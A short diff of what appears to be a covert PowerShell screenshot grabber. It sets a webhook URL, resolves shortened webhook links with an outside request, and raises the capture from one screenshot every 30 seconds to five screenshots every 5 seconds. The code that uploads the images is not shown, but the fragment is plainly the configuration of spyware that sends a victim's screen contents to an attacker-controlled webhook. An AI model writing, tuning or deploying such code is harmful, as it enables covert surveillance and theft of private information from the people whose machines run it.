@@ -1,6 +1,6 @@
 $hookurl = "$dc"
-$seconds = 30 # Screenshot interval
-$a = 1 # Sceenshot amount
+$seconds = 5 # Screenshot interval
+$a = 5 # Sceenshot amount
 
 # shortened URL Detection
 if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $hookurl = (irm $hookurl).url}
